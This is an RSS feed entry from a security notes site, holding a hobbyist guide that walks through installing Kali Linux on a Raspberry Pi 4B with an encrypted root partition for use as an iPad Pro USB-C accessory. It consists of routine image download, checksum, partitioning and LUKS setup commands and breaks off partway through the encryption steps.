<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
	<channel>
		<title>Cardboard Iguana Security</title>
		<link>https://www.cardboard-iguana.com</link>
		<description>Latest hacking notes, CTF walk-throughs, and random thoughts from Cardboard Iguana Security.</description>
		<copyright>Â© Nathan Acks</copyright>
		<language>en-us</language>
		<atom:link href="https://github.com/cardboard-iguana/hacking-notes/raw/main/feed.rss" rel="self" type="application/rss+xml" />
		<pubDate>Mon, 22 May 2023 05:18:22 +0000</pubDate>
		<lastBuildDate>Mon, 22 May 2023 05:18:22 +0000</lastBuildDate>
		<item>
			<title>Use a Raspberry Pi 4B as an iPad Pro Hacking Accessory</title>
			<link>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Use%20a%20Raspberry%20Pi%204B%20as%20an%20iPad%20Pro%20Hacking%20Accessory.md</link>
			<description>&lt;p&gt;This guide will cover setting up Kali Linux on a Raspberry Pi 4B so that:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;It can be used as a USB C &quot;gadget&quot; with an iPad Pro;&lt;/li&gt;&lt;li&gt;All files except for /boot are encrypted;&lt;/li&gt;&lt;li&gt;A full desktop environment is available on demand via RDP; and&lt;/li&gt;&lt;li&gt;The system &lt;em&gt;still&lt;/em&gt; works as a desktop device in a pinch (BYO keyboard, mouse, and monitor).&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;Be aware that this guide was written using the 64-bit 2021.2 Kali Linux image; YMMV with other images!&lt;/p&gt;&lt;p&gt;It should be possible to adapt the steps here for other Debian-based operating systems with a Raspberry Pi 4B compatible image. It should &lt;em&gt;also&lt;/em&gt; be possible to do this all in fewer steps; the guide below is split up in a very step-by-step fashion, and is in no way optimized for speed.&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://www.kali.org/&quot;&gt;Kali Linux&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://www.raspberrypi.org/products/raspberry-pi-4-model-b/&quot;&gt;Raspberry Pi 4 Model B&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://www.kali.org/docs/arm/raspberry-pi-4/&quot;&gt;Kali Linux Raspberry Pi 4 documentation&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://www.apple.com/ipad-pro/&quot;&gt;iPad Pro&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;h2 id=&quot;hardware-and-software&quot;&gt;Hardware and Software&lt;/h2&gt;&lt;p&gt;Things you'll want/need to follow along:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;A Raspberry Pi. (I use a 8 GB Raspberry Pi 4B.)&lt;/li&gt;&lt;li&gt;A good USB C cable. (The DockCase USB C cable is surprisingly great.)&lt;/li&gt;&lt;li&gt;A good microSD card. (I use a 64 GB Kingston Canvass Go! Plus.)&lt;/li&gt;&lt;li&gt;A second &quot;bootstrap&quot; microSD card that's at least 32 GB in size. (You need something &lt;em&gt;twice&lt;/em&gt; the size that your operating system image requires. This will just be used to &quot;bootstrap&quot; the encrypted microSD card, so it's only necessary if you're spinning the Pi up for the first time.)&lt;/li&gt;&lt;li&gt;A USB microSD card reader (since you'll need to have &lt;em&gt;both&lt;/em&gt; microSD cards connected to the Pi briefly.)&lt;/li&gt;&lt;li&gt;Physical access to a Linux system. (This could actually be the Pi itself, if you've already got it up and running with another operating system.)&lt;/li&gt;&lt;li&gt;An HDMI monitor, microHDMI-to-HDMI cable, and a USB keyboard (only needed until we set up network access and USB gadget mode).&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;With that out of the way, let's go!&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://www.adafruit.com/product/4564&quot;&gt;Raspberry Pi 4 Model B - 8 GB RAM (Adafruit)&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://www.amazon.com/dp/B07THFJ1J5&quot;&gt;DockCase USB C to USB C Cable (0.72ft), 3.1 Gen 2 (Amazon)&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://www.kingston.com/en/memory-cards/canvas-go-plus-microsd-card&quot;&gt;Kingston Canvass Go! Plus&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;h2 id=&quot;create-the-bootstrap-microsd&quot;&gt;Create the Bootstrap microSD&lt;/h2&gt;&lt;p&gt;If you're setting the Pi up for the first time, you'll need to burn a Kali Linux microSD card to bootstrap off of. (If you already have a working Pi, fire it up and skip to the next section.)&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb1&quot;&gt;&lt;pre class=&quot;sourceCode bash&quot;&gt;&lt;code class=&quot;sourceCode bash&quot;&gt;&lt;span id=&quot;cb1-1&quot;&gt;&lt;a href=&quot;#cb1-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# Download the latest version of Kali Linux from&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-2&quot;&gt;&lt;a href=&quot;#cb1-2&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# https://www.kali.org/get-kali/#kali-arm. Check that page to&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-3&quot;&gt;&lt;a href=&quot;#cb1-3&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# see which file name you should be using here (2021.2 is&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-4&quot;&gt;&lt;a href=&quot;#cb1-4&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# current at the time of this writing).&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-5&quot;&gt;&lt;a href=&quot;#cb1-5&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;#&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-6&quot;&gt;&lt;a href=&quot;#cb1-6&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;curl&lt;/span&gt; -O https://images.kali.org/arm-images/kali-linux-2021.2-rpi4-nexmon-64.img.xz&lt;/span&gt;
&lt;span id=&quot;cb1-7&quot;&gt;&lt;a href=&quot;#cb1-7&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-8&quot;&gt;&lt;a href=&quot;#cb1-8&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# Check the sha256 hash to make sure you&amp;#39;ve downloaded a good&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-9&quot;&gt;&lt;a href=&quot;#cb1-9&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# file (the hash used below is for the 2021.2 image).&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-10&quot;&gt;&lt;a href=&quot;#cb1-10&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;#&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-11&quot;&gt;&lt;a href=&quot;#cb1-11&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;sha256sum&lt;/span&gt; kali-linux-2021.2-rpi4-nexmon-64.img.xz &lt;span class=&quot;kw&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-12&quot;&gt;&lt;a href=&quot;#cb1-12&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    &lt;span class=&quot;fu&quot;&gt;grep&lt;/span&gt; -E &lt;span class=&quot;st&quot;&gt;&amp;quot;^97549d9e24dbd73add004b9521874dff6351a6275428356e804b98eb9e842c99 &amp;quot;&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-13&quot;&gt;&lt;a href=&quot;#cb1-13&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    &lt;span class=&quot;bu&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;st&quot;&gt;&amp;quot;SUCCESS - Download checksum looks good&amp;quot;&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-14&quot;&gt;&lt;a href=&quot;#cb1-14&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    &lt;span class=&quot;bu&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;st&quot;&gt;&amp;quot;FAILURE - Download checksum doesn&amp;#39;t match expected value; file corrupt or incorrect&amp;quot;&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-15&quot;&gt;&lt;a href=&quot;#cb1-15&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-16&quot;&gt;&lt;a href=&quot;#cb1-16&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# /dev/mmcblk0 is the SD card device on my system; YMMV. Be&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-17&quot;&gt;&lt;a href=&quot;#cb1-17&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# sure to use the right device here, or you can hose your&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-18&quot;&gt;&lt;a href=&quot;#cb1-18&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# system! If your system automatically mounts partitions on&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-19&quot;&gt;&lt;a href=&quot;#cb1-19&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# insert, then you&amp;#39;ll need to unmount them before performing&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-20&quot;&gt;&lt;a href=&quot;#cb1-20&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# this step.&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-21&quot;&gt;&lt;a href=&quot;#cb1-21&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;#&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-22&quot;&gt;&lt;a href=&quot;#cb1-22&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;fu&quot;&gt;xzcat&lt;/span&gt; kali-linux-2021.2-rpi4-nexmon-64.img.xz &lt;span class=&quot;kw&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-23&quot;&gt;&lt;a href=&quot;#cb1-23&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    &lt;span class=&quot;fu&quot;&gt;sudo&lt;/span&gt; dd of=/dev/mmcblk0 bs=4M status=progress&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;There's a small amount of free space on the Kali ROOTFS partition; it may be useful to drop any of the SSH private keys here that you'll eventually want to use to use to log into the Pi here to make it easier to copy them into the right locations later.&lt;/p&gt;&lt;p&gt;Pop the microSD card out, throw it in your Pi, boot up, log in. The first-run username and password are both &lt;code&gt;kali&lt;/code&gt;.&lt;/p&gt;&lt;p&gt;We'll need more space in ROOTFS than the Kali image provides out-of-the-box. The kalipi-config tool can make this happen, but unfortunately it doesn't recognize the the 64-bit images as a Raspberry Pi! To fix this, you'll need to edit /usr/bin/kalipi-config and hack the is_pi() function so that it always returns 0. Once you've done this, run &lt;code&gt;sudo kalipi-config&lt;/code&gt; and use Advanced Options &amp;gt; Expand Filesystem to reclaim the rest of your microSD card's space.&lt;/p&gt;&lt;p&gt;You're now ready to bootstrap your &lt;em&gt;actual&lt;/em&gt; system!&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://www.kali.org/docs/introduction/default-credentials/&quot;&gt;Kali's Default Credentials&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://raspberrypi.stackexchange.com/a/127378&quot;&gt;expand file system kali linux on SD card of 16GB&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://superuser.com/a/1263401&quot;&gt;How to mount a multi-partition disk image in Linux?&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;h2 id=&quot;set-up-the-encrypted-microsd-card&quot;&gt;Set Up the Encrypted microSD Card&lt;/h2&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb2&quot;&gt;&lt;pre class=&quot;sourceCode bash&quot;&gt;&lt;code class=&quot;sourceCode bash&quot;&gt;&lt;span id=&quot;cb2-1&quot;&gt;&lt;a href=&quot;#cb2-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# Download the latest version of Kali Linux from&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb2-2&quot;&gt;&lt;a href=&quot;#cb2-2&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# https://www.kali.org/get-kali/#kali-arm. Check that page to&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb2-3&quot;&gt;&lt;a href=&quot;#cb2-3&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# see which file name you should be using here (2021.2 is&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb2-4&quot;&gt;&lt;a href=&quot;#cb2-4&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# current at the time of this writing).&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb2-5&quot;&gt;&lt;a href=&quot;#cb2-5&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;#&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb2-6&quot;&gt;&lt;a href=&quot;#cb2-6&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;curl&lt;/span&gt; -O https://images.kali.org/arm-images/kali-linux-2021.2-rpi4-nexmon-64.img.xz&lt;/span&gt;
&lt;span id=&quot;cb2-7&quot;&gt;&lt;a href=&quot;#cb2-7&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;/span&gt;
&lt;span id=&quot;cb2-8&quot;&gt;&lt;a href=&quot;#cb2-8&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# Check the sha256 hash to make sure you&amp;#39;ve downloaded a good&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb2-9&quot;&gt;&lt;a href=&quot;#cb2-9&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# file (the hash used below is for the 2021.2 image).&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb2-10&quot;&gt;&lt;a href=&quot;#cb2-10&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;#&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb2-11&quot;&gt;&lt;a href=&quot;#cb2-11&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;sha256sum&lt;/span&gt; kali-linux-2021.2-rpi4-nexmon-64.img.xz &lt;span class=&quot;kw&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb2-12&quot;&gt;&lt;a href=&quot;#cb2-12&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    &lt;span class=&quot;fu&quot;&gt;grep&lt;/span&gt; -E &lt;span class=&quot;st&quot;&gt;&amp;quot;^97549d9e24dbd73add004b9521874dff6351a6275428356e804b98eb9e842c99 &amp;quot;&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb2-13&quot;&gt;&lt;a href=&quot;#cb2-13&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    &lt;span class=&quot;bu&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;st&quot;&gt;&amp;quot;SUCCESS - Download checksum looks good&amp;quot;&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb2-14&quot;&gt;&lt;a href=&quot;#cb2-14&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    &lt;span class=&quot;bu&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;st&quot;&gt;&amp;quot;FAILURE - Download checksum doesn&amp;#39;t match expected value; file corrupt or incorrect&amp;quot;&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb2-15&quot;&gt;&lt;a href=&quot;#cb2-15&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;/span&gt;
&lt;span id=&quot;cb2-16&quot;&gt;&lt;a href=&quot;#cb2-16&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# Decompress the image. Note that you may experience I/O hangs&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb2-17&quot;&gt;&lt;a href=&quot;#cb2-17&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# while decompressing the image; just be patient and wait for&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb2-18&quot;&gt;&lt;a href=&quot;#cb2-18&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# the Pi&amp;#39;s little green light to stop flashing.)&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb2-19&quot;&gt;&lt;a href=&quot;#cb2-19&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;#&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb2-20&quot;&gt;&lt;a href=&quot;#cb2-20&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;fu&quot;&gt;unxz&lt;/span&gt; kali-linux-2021.2-rpi4-nexmon-64.img.xz&lt;/span&gt;
&lt;span id=&quot;cb2-21&quot;&gt;&lt;a href=&quot;#cb2-21&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;/span&gt;
&lt;span id=&quot;cb2-22&quot;&gt;&lt;a href=&quot;#cb2-22&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# Everything from here on out needs to be run as root, so&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb2-23&quot;&gt;&lt;a href=&quot;#cb2-23&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# let&amp;#39;s use sudo to open a root shell now.&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb2-24&quot;&gt;&lt;a href=&quot;#cb2-24&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;#&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb2-25&quot;&gt;&lt;a href=&quot;#cb2-25&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;fu&quot;&gt;sudo&lt;/span&gt; -s&lt;/span&gt;
&lt;span id=&quot;cb2-26&quot;&gt;&lt;a href=&quot;#cb2-26&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;/span&gt;
&lt;span id=&quot;cb2-27&quot;&gt;&lt;a href=&quot;#cb2-27&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# Mount the partitions in the Kali disk image. Your image&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb2-28&quot;&gt;&lt;a href=&quot;#cb2-28&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# partitions will *probably* show up as /dev/loop0p1 and&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb2-29&quot;&gt;&lt;a href=&quot;#cb2-29&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# /dev/loop0p2, but you may want to check the symlinks under&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb2-30&quot;&gt;&lt;a href=&quot;#cb2-30&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# /dev/disk/by-label first, just to be sure.&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb2-31&quot;&gt;&lt;a href=&quot;#cb2-31&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;#&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb2-32&quot;&gt;&lt;a href=&quot;#cb2-32&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;losetup&lt;/span&gt; -Pf kali-linux-2021.2-rpi4-nexmon-64.img&lt;/span&gt;
&lt;span id=&quot;cb2-33&quot;&gt;&lt;a href=&quot;#cb2-33&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;fu&quot;&gt;mkdir&lt;/span&gt; /mnt/img-&lt;span class=&quot;dt&quot;&gt;{root,boot}&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb2-34&quot;&gt;&lt;a href=&quot;#cb2-34&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;fu&quot;&gt;mount&lt;/span&gt; /dev/loop0p1 /mnt/img-boot&lt;/span&gt;
&lt;span id=&quot;cb2-35&quot;&gt;&lt;a href=&quot;#cb2-35&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;fu&quot;&gt;mount&lt;/span&gt; /dev/loop0p2 /mnt/img-root&lt;/span&gt;
&lt;span id=&quot;cb2-36&quot;&gt;&lt;a href=&quot;#cb2-36&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;/span&gt;
&lt;span id=&quot;cb2-37&quot;&gt;&lt;a href=&quot;#cb2-37&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# Now connect up the microSD card reader and insert the first&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb2-38&quot;&gt;&lt;a href=&quot;#cb2-38&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# microSD card and partition it. My card shows up as&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb2-39&quot;&gt;&lt;a href=&quot;#cb2-39&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# /dev/mmcblk1 (so that&amp;#39;s what I&amp;#39;ll be using moving forward),&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb2-40&quot;&gt;&lt;a href=&quot;#cb2-40&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# but you&amp;#39;ll want to double-check this; if you use the wrong&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb2-41&quot;&gt;&lt;a href=&quot;#cb2-41&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# device here you can hose your system!&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb2-42&quot;&gt;&lt;a href=&quot;#cb2-42&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;#&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb2-43&quot;&gt;&lt;a href=&quot;#cb2-43&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# Delete the current partition, make sure you&amp;#39;re using a DOS&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb2-44&quot;&gt;&lt;a href=&quot;#cb2-44&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# partition table, and then create two new partitions:&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb2-45&quot;&gt;&lt;a href=&quot;#cb2-45&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;#&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb2-46&quot;&gt;&lt;a href=&quot;#cb2-46&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# The first partition should be a primary partition 256MB in&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb2-47&quot;&gt;&lt;a href=&quot;#cb2-47&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# size of type 0c (W95 FAT32 LBA).&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb2-48&quot;&gt;&lt;a href=&quot;#cb2-48&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;#&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb2-49&quot;&gt;&lt;a href=&quot;#cb2-49&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# The second partition should also be a primary partition. It&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb2-50&quot;&gt;&lt;a href=&quot;#cb2-50&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# should use the remainder of the space and be of type 83&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb2-51&quot;&gt;&lt;a href=&quot;#cb2-51&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# (Linux).&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb2-52&quot;&gt;&lt;a href=&quot;#cb2-52&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;#&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb2-53&quot;&gt;&lt;a href=&quot;#cb2-53&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;fdisk&lt;/span&gt; /dev/mmcblk1&lt;/span&gt;
&lt;span id=&quot;cb2-54&quot;&gt;&lt;a href=&quot;#cb2-54&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;/span&gt;
&lt;span id=&quot;cb2-55&quot;&gt;&lt;a href=&quot;#cb2-55&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# Format the new partitions, mount them, and copy over the&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb2-56&quot;&gt;&lt;a href=&quot;#cb2-56&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# operating system files.&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb2-57&quot;&gt;&lt;a href=&quot;#cb2-57&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;#&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb2-58&quot;&gt;&lt;a href=&quot;#cb2-58&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;mkfs.vfat&lt;/span&gt; -v -n BOOT /dev/mmcblk1p1&lt;/span&gt;
&lt;span id=&quot;cb2-59&quot;&gt;&lt;a href=&quot;#cb2-59&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;cryptsetup&lt;/span&gt; -v -y luksFormat /dev/mmcblk1p2&lt;/span&gt;
&lt;span id=&quot;cb2-60&quot;&gt;&lt;a href=&quot;#cb2-60&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;cryptsetup&lt;/span&gt; luksOpen /dev/mmcblk1p2 crypt_rootfs&lt;/span&gt;
